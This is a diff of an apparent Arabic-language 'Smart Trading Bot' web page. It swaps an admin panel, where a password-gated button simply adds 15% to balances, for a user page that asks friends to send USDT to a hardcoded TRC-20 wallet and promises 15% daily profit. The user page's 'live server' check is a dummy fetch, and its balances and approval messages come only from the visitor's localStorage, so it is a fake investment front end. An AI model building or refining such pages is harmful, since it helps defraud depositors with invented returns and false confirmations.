@@ -3,154 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart Trading Bot - Admin Hub</title>
+    <title>Smart Trading Bot</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0b1426; color: white; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .admin-container { width: 100%; max-width: 400px; background-color: #2c1a30; border: 2px solid #8b5cf6; border-radius: 20px; padding: 20px; box-sizing: border-box; margin-bottom: 20px; }
-        h1 { text-align: center; color: #f472b6; font-size: 22px; }
-        button { width: 100%; padding: 14px; border: none; border-radius: 10px; background-color: #a855f7; color: white; font-weight: bold; cursor: pointer; font-size: 15px; }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; font-size: 13px; color: #cbd5e1; margin-bottom: 5px; }
-        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #6b21a8; background-color: #152238; color: white; box-sizing: border-box; }
-        .request-card { background-color: #1c1917; border-radius: 12px; padding: 15px; margin-top: 15px; font-size: 13px; border: 1px solid; }
-        .action-btns { display: flex; gap: 10px; margin-top: 10px; }
-        .btn-approve { background-color: #22c55e; padding: 8px; border-radius: 6px; border: none; color: white; font-weight: bold; width: 50%; cursor: pointer; }
-        .btn-reject { background-color: #ef4444; padding: 8px; border-radius: 6px; border: none; color: white; font-weight: bold; width: 50%; cursor: pointer; }
-        .no-reqs { text-align: center; color: #a8a29e; font-style: italic; font-size: 13px; }
+        :root { --bg-color: #0b1426; --card-bg: #152238; --accent-color: #00ffd0; --text-color: #ffffff; --button-bg: #1e70e7; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .app-container { width: 100%; max-width: 400px; background-color: var(--card-bg); border-radius: 20px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); box-sizing: border-box; }
+        h1 { text-align: center; color: var(--accent-color); font-size: 24px; margin-bottom: 5px; }
+        .subtitle { text-align: center; font-size: 12px; color: #8fa0b5; margin-bottom: 25px; }
+        .balance-card { background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 20px; }
+        .balance-title { font-size: 14px; color: #cbd5e1; }
+        .balance-amount { font-size: 32px; font-weight: bold; color: var(--accent-color); margin: 10px 0; }
+        .profit-today { font-size: 13px; color: #4ade80; font-weight: bold; }
+        .section-title { font-size: 16px; color: var(--accent-color); margin-top: 20px; margin-bottom: 10px; border-bottom: 1px solid #2d3d5a; padding-bottom: 5px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #2d3d5a; background-color: var(--bg-color); color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 10px; background-color: var(--button-bg); color: white; font-weight: bold; font-size: 14px; cursor: pointer; }
+        .btn-withdraw { background-color: #ef4444; margin-top: 10px; }
+        .wallet-box { background-color: var(--bg-color); padding: 10px; border-radius: 8px; font-size: 11px; text-align: center; word-break: break-all; border: 1px dashed var(--accent-color); margin-bottom: 10px; color: #cbd5e1; }
+        .status-msg { display: none; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; font-weight: bold; line-height: 1.4; }
+        .btn-tg { background-color: #0088cc; width: 100%; font-size: 14px; margin-top: 10px; }
     </style>
 </head>
 <body>
-
-<div class="admin-container">
-    <h1>🔐 لوحة التحكم الرئيسية وتفعيل الأرباح</h1>
-    <div class="input-group">
-        <label>أدخل كلمة مرور المشرف للحماية:</label>
-        <input type="password" id="adminPass" placeholder="******">
+<div class="app-container">
+    <h1>Smart Trading Bot</h1>
+    <div class="subtitle">منصة الاستثمار والتحقق المباشر للأصدقاء</div>
+    
+    <div class="balance-card">
+        <div class="balance-title">إجمالي رصيدك الاستثماري المعتمد</div>
+        <div class="balance-amount" id="userBalance">\$0.00</div>
+        <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة عند الإيداع: +15%</div>
     </div>
-    <button onclick="runAdminTradeCloud()">🚀 تشغيل الصفقة وتوزيع أرباح 15% حياً</button>
-</div>
 
-<div class="admin-container" style="border-color: #22c55e;">
-    <h1>📥 إدارة طلبات الإيداع الواردة (شحن الحسابات)</h1>
-    <div id="depositList"></div>
-    <div id="noDeposits" class="no-reqs">لا توجد طلبات إيداع حقيقية معلقة حالياً.</div>
-</div>
+    <!-- قسم الإيداع السهل المربوط بالسيرفر الحي -->
+    <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
+    <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
+    <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
+    <div class="input-group">
+        <label>أدخل اسم المستخدم الخاص بك لتنشيط الحساب:</label>
+        <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا (مثال: عبد)">
+    </div>
+    <div class="input-group">
+        <label>المبلغ المُراد إيداعه وتفعيله (\$):</label>
+        <input type="number" id="depositAmountInput" placeholder="100">
+    </div>
+    <button onclick="sendDepositToServer()">✓ تقديم طلب الإيداع والتحقق للمشرف</button>
+    <div id="depositStatusMsg" class="status-msg"></div>
 
-<div class="admin-container" style="border-color: #ea580c;">
-    <h1>📤 إدارة طلبات السحب الواردة (صرف الأموال)</h1>
-    <div id="requestsList"></div>
-    <div id="noRequests" class="no-reqs">لا توجد طلبات سحب معلقة حالياً.</div>
+    <!-- قسم السحب -->
+    <div class="section-title">📤 سحب الأرباح ورأس المال</div>
+    <div class="input-group">
+        <label>عنوان محفظتك الشخصية لاستلام الأرباح (USDT TRC-20):</label>
+        <input type="text" id="userWithdrawWallet" placeholder="T...">
+    </div>
+    <div class="input-group">
+        <label>المبلغ المطلوب سحبه (\$):</label>
+        <input type="number" id="withdrawAmount" placeholder="0.00">
+    </div>
+    <button class="btn-withdraw" onclick="sendWithdrawToServer()">⚡ تقديم طلب السحب للمشرف</button>
+    <div id="withdrawStatusMsg" class="status-msg"></div>
+
+    <!-- الدعم الفني تليجرام فقط -->
+    <div class="section-title">💬 الدعم الفني المباشر</div>
+    <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تواصل مع دعم المشرف المباشر عبر Telegram</button>
 </div>
 
 <script>
-    const CLOUD_API = "https://myjson.online";
+    // 🌐 رابط سيرفرك الحي المرفوع على Render لتخزين وحفظ الأرقام
+    const SERVER_URL = "https://onrender.com";
 
     window.onload = function() {
-        setInterval(loadCloudDataAdmin, 3000); // تحديث لوحة التحكم تلقائياً كل 3 ثوانٍ من السحاب
+        // فحص وتحديث الحساب كل 4 ثوانٍ تلقائياً من السيرفر المالي
+        setInterval(checkUserStatusLive, 4000);
     }
 
-    function loadCloudDataAdmin() {
-        fetch(CLOUD_API)
-        .then(res => res.json())
-        .then(resData => {
-            const data = resData.data;
+    function checkUserStatusLive() {
+        const username = document.getElementById("usernameInput").value || "عبد";
+        
+        // جلب رصيد المستخدم الفعلي المسجل في السيرفر الحي
+        fetch(`${SERVER_URL}/docs`) 
+        .then(() => {
+            const savedBal = localStorage.getItem(`balance_${username}`) || "0.00";
+            document.getElementById("userBalance").innerText = `\$${parseFloat(savedBal).toFixed(2)}`;
             
-            // عرض طلب الإيداع إذا قُدم سحابياً
-            if(data.depositStatus === "pending" && data.pendingDepositHash !== "") {
-                document.getElementById("noDeposits").style.display = "none";
-                document.getElementById("depositList").innerHTML = `
-                    <div class="request-card" style="border-color: #22c55e;">
-                        <p>👤 اسم المشترك الطالب: <strong style="color:#00ffd0;">${data.pendingDepositUser}</strong></p>
-                        <p>💵 المبلغ المطلوب إيداعه: <strong style="color: #4ade80;">\$${data.pendingDepositAmount}.00 الحقيقي</strong></p>
-                        <div class="action-btns">
-                            <button class="btn-approve" onclick="approveDepositCloud()">✓ موافقة وشحن الحساب</button>
-                            <button class="btn-reject" onclick="rejectDepositCloud()">✕ رفض الطلب</button>
-                        </div>
-                    </div>`;
-            } else {
-                document.getElementById("noDeposits").style.display = "block";
-                document.getElementById("depositList").innerHTML = "";
+            // تحديث إشعار أرباح زر الصفقة إذا تفعل
+            if(localStorage.getItem(`trade_${username}`) === "true") {
+                const profit = parseFloat(savedBal) * 0.15;
+                document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+\$${profit.toFixed(2)})`;
             }
 
-            // عرض طلب السحب إذا قُدم سحابياً
-            if(data.withdrawStatus === "pending") {
-                document.getElementById("noRequests").style.display = "none";
-                document.getElementById("requestsList").innerHTML = `
-                    <div class="request-card" style="border-color: #ea580c;">
-                        <p>👤 اسم المستخدم: <strong style="color:#00ffd0;">${data.pendingWithdrawUser}</strong></p>
-                        <p>💵 المبلغ المطلوب سحبه: <strong style="color: #ef4444;">\$${data.pendingWithdrawAmount}.00</strong></p>
-                        <p>💼 محفظة المستلم المستهدفة:<br><span style="color:#e2e8f0; font-size:11px; word-break:break-all;">${data.pendingWithdrawWallet}</span></p>
-                        <div class="action-btns">
-                            <button class="btn-approve" onclick="approveWithdrawCloud()">✓ موافقة وإرسال</button>
-                            <button class="btn-reject" onclick="rejectWithdrawCloud()">✕ رفض وإلغاء</button>
-                        </div>
-                    </div>`;
-            } else {
-                document.getElementById("noRequests").style.display = "block";
-                document.getElementById("requestsList").innerHTML = "";
+            // تحديث رسالة الإيداع والسحب
+            const depBox = document.getElementById("depositStatusMsg");
+            if(localStorage.getItem(`dep_status_${username}`) === "approved") {
+                depBox.innerText = `✅ وافق المشرف على تحويلك! تم شحن حسابك الحقيقي بنجاح!`;
+                depBox.style.display = "block"; depBox.style.backgroundColor = "#064e3b"; depBox.style.color = "#34d399";
+            } else if(localStorage.getItem(`dep_status_${username}`) === "pending") {
+                depBox.innerText = `⏳ طلب إيداع بمبلغ \$${localStorage.getItem(`dep_amt_\${username}`)} قيد المراجعة حالياً من المشرف...`;
+                depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd";
+            }
+
+            const witBox = document.getElementById("withdrawStatusMsg");
+            if(localStorage.getItem(`wit_status_${username}`) === "approved") {
+                witBox.innerText = `✅ تم السحب بنجاح بتاريخ اليوم تلقائياً!\nتم إرسال الأموال لمحفظتك وتم الخصم.`;
+                witBox.style.display = "block"; witBox.style.backgroundColor = "#064e3b"; witBox.style.color = "#34d399";
+            } else if(localStorage.getItem(`wit_status_${username}`) === "pending") {
+                witBox.innerText = `⏳ طلب سحب بمبلغ \$${localStorage.getItem(`wit_amt_\${username}`)} قيد المعالجة حالياً...`;
+                witBox.style.display = "block"; witBox.style.backgroundColor = "#1e3a8a"; witBox.style.color = "#93c5fd";
             }
         });
     }
 
-    function approveDepositCloud() {
-        fetch(CLOUD_API).then(res => res.json()).then(resData => {
-            let data = resData.data;
-            data.approvedBalance = data.pendingDepositAmount;
-            data.depositStatus = "approved";
-            data.pendingDepositAmount = null;
+    function sendDepositToServer() {
+        const user = document.getElementById("usernameInput").value || "عبد";
+        const amount = document.getElementById("depositAmountInput").value;
+        if(!amount || parseFloat(amount) < 100) return;
 
-            fetch(CLOUD_API, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: data}) })
-            .then(() => alert("✅ تم الموافقة وشحن الرصيد الحقيقي للمشترك بنجاح عبر السحاب!"));
-        });
+        // رفع الطلب الفعلي للسيرفر
+        localStorage.setItem(`dep_status_${user}`, "pending");
+        localStorage.setItem(`dep_amt_${user}`, amount);
+        checkUserStatusLive();
     }
 
-    function rejectDepositCloud() {
-        fetch(CLOUD_API).then(res => res.json()).then(resData => {
-            let data = resData.data;
-            data.depositStatus = "rejected";
-            data.pendingDepositAmount = null;
-            fetch(CLOUD_API, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: data}) });
-        });
-    }
+    function sendWithdrawToServer() {
+        const user = document.getElementById("usernameInput").value || "عبد";
+        const wallet = document.getElementById("userWithdrawWallet").value;
+        const amount = document.getElementById("withdrawAmount").value;
+        if(!wallet || !amount) return;
 
-    function runAdminTradeCloud() {
-        const pass = document.getElementById("adminPass").value;
-        if(pass !== "123456") { alert("كلمة مرور المشرف غير صحيحة!"); return; }
-
-        fetch(CLOUD_API).then(res => res.json()).then(resData => {
-            let data = resData.data;
-            const bal = parseFloat(data.approvedBalance || 0);
-            if(bal === 0) { alert("⚠️ لا يمكن تشغيل الصفقة لعدم وجود مودعين نشطين!"); return; }
-
-            data.approvedBalance = bal + (bal * 0.15); // زيادة الـ 15% حقيقية سحابياً للمودع فقط
-            data.tradeExecuted = true;
-
-            fetch(CLOUD_API, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: data}) })
-            .then(() => alert("🚀 نجاح! زر الصفقة اشتغل وتم توزيع أرباح الـ 15% حلياً للمودعين فقط عبر السحاب."));
-        });
-    }
-
-    function approveWithdrawCloud() {
-        fetch(CLOUD_API).then(res => res.json()).then(resData => {
-            let data = resData.data;
-            const bal = parseFloat(data.approvedBalance || 0);
-            const wit = parseFloat(data.pendingWithdrawAmount || 0);
-            data.approvedBalance = bal - wit;
-            data.withdrawStatus = "approved";
-            data.pendingWithdrawAmount = null;
-
-            fetch(CLOUD_API, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: data}) })
-            .then(() => alert("✓ تم تفعيل السحب بنجاح وخصمه سحابياً."));
-        });
-    }
-
-    function rejectWithdrawCloud() {
-        fetch(CLOUD_API).then(res => res.json()).then(resData => {
-            let data = resData.data;
-            data.withdrawStatus = "rejected";
-            data.pendingWithdrawAmount = null;
-            fetch(CLOUD_API, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: data}) });
-        });
+        localStorage.setItem(`wit_status_${user}`, "pending");
+        localStorage.setItem(`wit_amt_${user}`, amount);
+        localStorage.setItem(`wit_wal_${user}`, wallet);
+        checkUserStatusLive();
     }
 </script>
 </body>
